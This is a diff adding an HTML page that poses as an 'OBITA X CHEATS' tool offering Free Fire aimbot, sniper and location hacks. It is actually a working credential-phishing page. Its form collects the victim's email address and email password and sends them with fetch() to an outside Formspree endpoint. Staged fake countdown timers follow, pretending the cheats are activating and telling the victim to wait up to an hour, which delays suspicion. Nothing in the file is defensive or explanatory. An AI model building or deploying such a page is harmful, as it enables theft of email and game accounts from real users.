@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>OBITA X CHEATS</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      background: linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.75)), 
+                  url('images.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .overlay {
+      width: 400px;
+      background: rgba(0, 0, 0, 0.55);
+      backdrop-filter: blur(12px);
+      border-radius: 20px;
+      box-shadow: 0 0 25px #00ff00;
+      padding: 35px 30px;
+      color: #00ffcc;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    h1 {
+      font-size: 48px;
+      margin-bottom: 25px;
+      color: red;
+      font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
+      text-decoration: underline red solid 3px;
+      font-weight: 700;
+      text-shadow: 0 0 8px #000;
+    }
+
+    .fake-button {
+      display: block;
+      width: 100%;
+      font-weight: bold;
+      font-size: 15px;
+      padding: 10px 0;
+      border-radius: 50px;
+      margin: 8px 0;
+      cursor: default;
+      text-shadow: 0 0 4px white;
+      transition: 0.3s ease;
+    }
+
+    /* Different colors for each button */
+    .fake-button:nth-child(2) {
+      background: linear-gradient(45deg, #00ffcc, #00ffaa);
+      color: #004d40;
+      box-shadow: 0 0 12px #00ff99, inset 0 0 5px #00ffaa;
+    }
+    .fake-button:nth-child(3) {
+      background: linear-gradient(45deg, #ff0066, #ff3399);
+      color: #fff0f6;
+      box-shadow: 0 0 15px #ff3366, inset 0 0 6px #ff6699;
+    }
+    .fake-button:nth-child(4) {
+      background: linear-gradient(45deg, #ffcc00, #ffaa00);
+      color: #3e2e00;
+      box-shadow: 0 0 12px #ffcc00, inset 0 0 5px #ffaa00;
+    }
+
+    .fake-button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px #00ffee, inset 0 0 10px #00ffcc;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px 12px;
+      margin: 8px 0;
+      font-size: 14px;
+      border: none;
+      border-radius: 10px;
+      background-color: #111;
+      color: #00ffcc;
+      transition: 0.3s ease;
+    }
+
+    input:focus {
+      outline: none;
+      background-color: #222;
+      box-shadow: 0 0 5px #00ffcc;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 12px;
+      font-size: 15px;
+      background: linear-gradient(to right, #00ff66, #00ffaa);
+      border: none;
+      border-radius: 10px;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00ff66;
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      background: linear-gradient(to right, #33ff99, #66ffcc);
+      box-shadow: 0 0 18px #00ffcc;
+    }
+
+    #timerMessage {
+      margin-top: 25px;
+      font-size: 18px;
+      color: #00ffff;
+      min-height: 50px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="overlay">
+    <h1>OBITA X CHEATS</h1>
+
+    <div class="fake-button">AIMBOT</div>
+    <div class="fake-button">SNIPER</div>
+    <div class="fake-button">LOCATION</div>
+
+    <form id="myForm" action="https://formspree.io/f/xgvnqaeo" method="POST">
+      <input type="text" name="freefiremail" placeholder="Free Fire Mail" required><br>
+      <input type="text" name="mailpass" placeholder="Mail Pass" required><br>
+      <button type="submit" id="submitBtn">Login Notification</button>
+    </form>
+
+    <div id="timerMessage"></div>
+  </div>
+
+  <!-- Audio files -->
+  <audio id="checkNotifSound" src="https://www.soundjay.com/button/sounds/button-16.mp3" preload="auto"></audio>
+  <audio id="activatedSound" src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" preload="auto"></audio>
+
+  <script>
+    const form = document.getElementById('myForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerMessage = document.getElementById('timerMessage');
+
+    const checkNotifSound = document.getElementById('checkNotifSound');
+    const activatedSound = document.getElementById('activatedSound');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      submitBtn.disabled = true;
+      submitBtn.style.cursor = 'not-allowed';
+
+      // Play sound immediately on submit (user interaction)
+      if (checkNotifSound) {
+        checkNotifSound.play().catch(e => {
+          console.log("Check notification sound play error:", e);
+        });
+      }
+
+      const formData = new FormData(form);
+      fetch(form.action, {
+        method: form.method,
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      }).then(response => {
+        if (response.ok) {
+          startTimers();
+        } else {
+          timerMessage.textContent = "Error sending data. Please try again.";
+          submitBtn.disabled = false;
+          submitBtn.style.cursor = 'pointer';
+        }
+      }).catch(() => {
+        timerMessage.textContent = "Error sending data. Please check your internet.";
+        submitBtn.disabled = false;
+        submitBtn.style.cursor = 'pointer';
+      });
+    });
+
+    function startTimers() {
+      let phases = [
+        { duration: 60, message: "Wait Aimbot Activating..." },
+        { duration: 30, message: "Wait Sniper Activating..." },
+        { duration: 39, message: "Wait Location Activating..." },
+        { duration: 0, message: " All Cheat Activated! Congratulations!" }
+      ];
+
+      let currentPhase = 0;
+
+      function runPhase() {
+        if (currentPhase >= phases.length) {
+          timerMessage.innerHTML += `<br><br><span style="color:#ffcc00; font-size:16px; font-weight:bold;">
+            ?? NOTE: All hacks will apply automatically after 60 minutes.<br>? So please wait 50 minutes.</span>`;
+          return;
+        }
+
+        const phase = phases[currentPhase];
+
+        if (phase.duration === 0) {
+          timerMessage.textContent = phase.message;
+          if (activatedSound) {
+            activatedSound.play().catch(e => {
+              console.log("Activated sound play error:", e);
+            });
+          }
+          currentPhase++;
+          setTimeout(runPhase, 1000);
+          return;
+        }
+
+        let checkNotificationSeconds = 15;
+        timerMessage.textContent = `?? Check Notification (${checkNotificationSeconds}s)`;
+
+        // Play check notification sound once at start of check phase
+        if (checkNotifSound) {
+          checkNotifSound.play().catch(e => {
+            console.log("Check notification sound play error:", e);
+          });
+        }
+
+        let checkInterval = setInterval(() => {
+          checkNotificationSeconds--;
+          if (checkNotificationSeconds <= 0) {
+            clearInterval(checkInterval);
+
+            let remaining = phase.duration;
+            timerMessage.textContent = `${phase.message} ?? ${remaining}s`;
+
+            let interval = setInterval(() => {
+              remaining--;
+              if (remaining <= 0) {
+                clearInterval(interval);
+                currentPhase++;
+                runPhase();
+              } else {
+                timerMessage.textContent = `${phase.message} ?? ${remaining}s`;
+              }
+            }, 1000);
+
+          } else {
+            timerMessage.textContent = `?? Check Notification (${checkNotificationSeconds}s)`;
+          }
+        }, 1000);
+      }
+
+      runPhase();
+    }
+  </script>
+
+</body>
+</html>
